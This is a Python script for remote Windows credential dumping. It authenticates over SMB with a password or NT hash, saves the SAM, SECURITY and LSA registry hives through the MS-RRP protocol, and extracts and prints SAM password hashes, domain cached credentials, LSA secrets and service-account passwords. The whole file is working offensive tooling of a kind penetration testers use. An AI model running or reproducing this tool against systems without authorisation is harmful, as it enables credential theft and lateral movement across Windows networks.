#!/usr/bin/env python3

from asyncio import run as asyncio_run
from argparse import Namespace as ArgparseNamespace
from pathlib import PureWindowsPath
from typing import Optional
from io import BytesIO
from sys import stderr
from logging import getLogger, WARNING, StreamHandler

from smb.transport import TCPIPTransport
from smb.v2.connection import Connection as SMBv2Connection
from smb.v2.session import Session as SMBv2Session
from rpc.connection import Connection as RPCConnection
from rpc.structures.context_list import ContextList, ContextElement
from ms_rrp import MS_RRP_ABSTRACT_SYNTAX, MS_RRP_PIPE_NAME
from ms_rrp.operations.open_local_machine import open_local_machine, OpenLocalMachineRequest, Regsam
from msdsalgs.ntstatus_value import StatusLogonFailureError, StatusBadNetworkNameError
from Registry.Registry import Registry
from ms_rrp.utils import dump_reg

from dump_windows_secrets import get_secrets_output_string, resolve_service_credentials
from dump_windows_secrets.cli import DumpRemoteWindowsSecretsArgumentParser
from dump_windows_secrets.dump_lsa import dump_lsa_secrets
from dump_windows_secrets.dump_lsa.structures.domain_cached_credentials import DomainCachedCredentials2
from dump_windows_secrets.dump_lsa.key_extraction import get_boot_key
from dump_windows_secrets.dump_sam import dump_sam_secrets, SAMEntry

LOG = getLogger(__name__)


async def dump_remote_windows_secrets(
    smb_session: SMBv2Session,
    skip_lsa_secrets: bool = False,
    skip_sam_secrets: bool = False,
    dump_reg_share_name: str = 'C$',
    dump_reg_path: Optional[PureWindowsPath] = None
) -> tuple[Optional[list[SAMEntry]], Optional[list[DomainCachedCredentials2]], Optional[dict[str, bytes]]]:
    """
    Dump Windows secrets remotely over SMB.

    The secrets are obtained by reading and then processing data from the Windows registry. The MS-RRP protocol is used
    to read the data remotely. The relevant registry values are saved to disk on the remote system with the
    `BaseRegSaveKey` RRP operation, and are then retrieved via the SMB READ command, after which the files on disk are
    deleted.

    :param smb_session: An SMB session with which to remotely dump the Windows secrets.
    :param skip_lsa_secrets: Whether to skip the extraction of LSA secrets.
    :param skip_sam_secrets: Whether to skip the extraction of SAM secrets.
    :param dump_reg_share_name: A name of an SMB share on the remote system in which the disk-saved registry values can
        be obtained.
    :param dump_reg_path: A path on the remote system where the relevant registry values are to be saved on disk.
    :return: Optionally, a list of SAM entries, domain cached credentials, and policy secrets.
    """

    if skip_lsa_secrets and skip_sam_secrets:
        return None, None, None

    async with smb_session.tree_connect(share_name=dump_reg_share_name) as (tree_id, _):
        async with smb_session.make_smbv2_transport(pipe=MS_RRP_PIPE_NAME) as (reader, writer):
            async with RPCConnection(reader=reader, writer=writer) as rpc_connection:
                await rpc_connection.bind(
                    presentation_context_list=ContextList([
                        ContextElement(context_id=0, abstract_syntax=MS_RRP_ABSTRACT_SYNTAX)
                    ])
                )

                open_local_machine_options = dict(
                    rpc_connection=rpc_connection,
                    request=OpenLocalMachineRequest(
                        sam_desired=Regsam(maximum_allowed=True)
                    )
                )
                async with open_local_machine(**open_local_machine_options) as open_local_machine_response:
                    # TODO: `asyncio.gather` isn't working here for some reason...

                    lsa_data: bytes = await dump_reg(
                        rpc_connection=rpc_connection,
                        smb_session=smb_session,
                        root_key_handle=open_local_machine_response.key_handle,
                        tree_id=tree_id,
                        sub_key_name=r'SYSTEM\CurrentControlSet\Control\Lsa',
                        save_path=dump_reg_path
                    )

                    security_data: Optional[bytes] = await dump_reg(
                        rpc_connection=rpc_connection,
                        smb_session=smb_session,
                        root_key_handle=open_local_machine_response.key_handle,
                        tree_id=tree_id,
                        sub_key_name='SECURITY',
                        save_path=dump_reg_path
                    ) if not skip_lsa_secrets else None

                    sam_data: Optional[bytes] = await dump_reg(
                        rpc_connection=rpc_connection,
                        smb_session=smb_session,
                        root_key_handle=open_local_machine_response.key_handle,
                        tree_id=tree_id,
                        sub_key_name='SAM',
                        save_path=dump_reg_path
                    ) if not skip_sam_secrets else None

    boot_key: bytes = get_boot_key(lsa_registry=Registry(BytesIO(lsa_data)), from_root=False)

    if not skip_lsa_secrets:
        domain_cached_credentials, policy_secrets = dump_lsa_secrets(
            security_registry=Registry(BytesIO(security_data)),
            boot_key=boot_key
        )
    else:
        domain_cached_credentials, policy_secrets = None, None

    return (
        dump_sam_secrets(sam_dump=sam_data, boot_key=boot_key) if not skip_sam_secrets else None,
        domain_cached_credentials,
        policy_secrets
    )


async def main():
    args: ArgparseNamespace = DumpRemoteWindowsSecretsArgumentParser().parse_args()

    LOG.setLevel(level=WARNING)
    LOG.addHandler(hdlr=StreamHandler(stream=stderr))

    try:
        # TODO: Add option to change port number.
        async with TCPIPTransport(address=args.target_address, port_number=445) as tcp_ip_transport:
            async with SMBv2Connection(tcp_ip_transport=tcp_ip_transport) as smb_connection:
                await smb_connection.negotiate()

                # TODO: Have the argument parser turn the NT hash into bytes?
                setup_session_options = dict(
                    username=args.username,
                    authentication_secret=args.password or bytes.fromhex(args.nt_hash)
                )
                async with smb_connection.setup_session(**setup_session_options) as smb_session:
                    sam_entries, domain_cached_credentials, policy_secrets = await dump_remote_windows_secrets(
                        smb_session=smb_session,
                        skip_lsa_secrets=args.skip_lsa_secrets,
                        skip_sam_secrets=args.skip_sam_secrets,
                        dump_reg_share_name=args.dump_reg_share,
                        dump_reg_path=args.dump_reg_path
                    )

                    service_account_name_to_password: dict[str, str] = await resolve_service_credentials(
                        smb_session=smb_session,
                        policy_secrets=policy_secrets
                    ) if (not args.skip_lsa_secrets and not args.skip_service_passwords) else None

        print(
            get_secrets_output_string(
                sam_entries=sam_entries,
                service_account_name_to_password=service_account_name_to_password,
                domain_cached_credentials=domain_cached_credentials,
                policy_secrets=policy_secrets
            )
        )
    except StatusLogonFailureError as e:
        LOG.error(f'{e} -- Username: {args.username}, Authentication secret: {args.password or args.nt_hash}.')
    except StatusBadNetworkNameError as e:
        LOG.error(f'{e} -- Share name: {args.dump_reg_share}.')
    except Exception as e:
        LOG.exception(e)


if __name__ == '__main__':
    asyncio_run(main())
